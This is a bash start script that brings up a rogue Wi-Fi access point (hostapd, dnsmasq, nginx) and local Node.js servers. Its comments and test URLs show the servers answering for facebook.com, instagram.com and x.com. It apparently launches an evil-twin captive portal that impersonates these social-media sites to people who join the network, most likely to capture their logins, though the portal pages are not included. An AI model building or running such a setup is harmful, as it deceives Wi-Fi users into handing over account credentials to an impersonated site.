#!/bin/bash
# Wrapper start script to run captive servers and existing nginx/scripts/start.sh
# This script orchestrates all components: hostapd, dnsmasq, nginx, and node servers

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
CAPTIVE_DIR="$ROOT_DIR/nginx/captive"
NGINX_SCRIPT="$ROOT_DIR/nginx/scripts/start.sh"
HOSTAPD_CONF="$ROOT_DIR/nginx/configs/hostapd.conf"
DNSMASQ_CONF="$ROOT_DIR/nginx/configs/dnsmasq.conf"

# Function to stop services
stop_services() {
    echo "[*] Stopping services..."
    sudo killall node dnsmasq hostapd nginx 2>/dev/null || true
    sudo systemctl stop nginx dnsmasq hostapd 2>/dev/null || true
}

# Function to check if a port is responding with 200 OK
check_port() {
    local port=$1
    local max_attempts=30
    local attempt=1
    
    echo "[*] Checking service on port $port..."
    while [ $attempt -le $max_attempts ]; do
        if curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port" | grep -q "200"; then
            echo "[✓] Service on port $port is running"
            return 0
        fi
        sleep 1
        attempt=$((attempt + 1))
    done
    echo "[!] Service on port $port failed to respond with 200 OK"
    return 1
}

# Stop any running services first
stop_services

# Default gateway used by the existing scripts
GATEWAY="192.168.4.1"

echo "[*] Wrapper start: preparing environment..."

# Detect interface from hostapd.conf (first 'interface=' line)
if [ -f "$HOSTAPD_CONF" ]; then
  IFACE=$(grep -E '^interface=' "$HOSTAPD_CONF" | head -n1 | cut -d'=' -f2 | tr -d '\r\n') || true
fi

IFACE=${IFACE:-"wlx00c0cab84be3"}

echo "[*] Using interface: $IFACE"

echo "[*] Bringing interface up and assigning IP $GATEWAY/24"
sudo ip link set "$IFACE" down || true
sudo ip addr flush dev "$IFACE" || true
sudo ip addr add ${GATEWAY}/24 dev "$IFACE"
sudo ip link set "$IFACE" up

# Configure and start dnsmasq
echo "[*] Starting dnsmasq..."
if [ -f "$DNSMASQ_CONF" ]; then
    sudo dnsmasq -C "$DNSMASQ_CONF"
else
    echo "[!] dnsmasq.conf not found"
    exit 1
fi

# Start hostapd
echo "[*] Starting hostapd..."
if [ -f "$HOSTAPD_CONF" ]; then
    sudo hostapd "$HOSTAPD_CONF" -B
else
    echo "[!] hostapd.conf not found"
    exit 1
fi

# Start nginx with custom config
echo "[*] Starting nginx..."
sudo ln -sf "$ROOT_DIR/nginx/configs/nginx.conf" /etc/nginx/nginx.conf
sudo nginx -t && sudo systemctl restart nginx

# Install dependencies and start Node.js servers
echo "[*] Setting up and starting captive portal servers..."
if [ -f "$CAPTIVE_DIR/setup.sh" ] && [ -f "$CAPTIVE_DIR/start-server.sh" ]; then
    (cd "$CAPTIVE_DIR" && sudo bash setup.sh)
    (cd "$CAPTIVE_DIR" && sudo bash start-server.sh)
    
    # Check if services are running properly
    echo "[*] Verifying services..."
    check_port 3000 # Facebook
    check_port 3001 # Instagram
    check_port 3002 # X/Twitter
    check_port 3003 # Default
else
    echo "[!] setup.sh or start-server.sh not found in $CAPTIVE_DIR"
    exit 1
fi

echo "[*] All services started. Use './stop.sh' to stop all services."
echo "[*] Test URLs:"
echo "http://facebook.com"
echo "http://instagram.com"
echo "http://x.com"
echo "http://any-other-domain.com (will show default portal)"
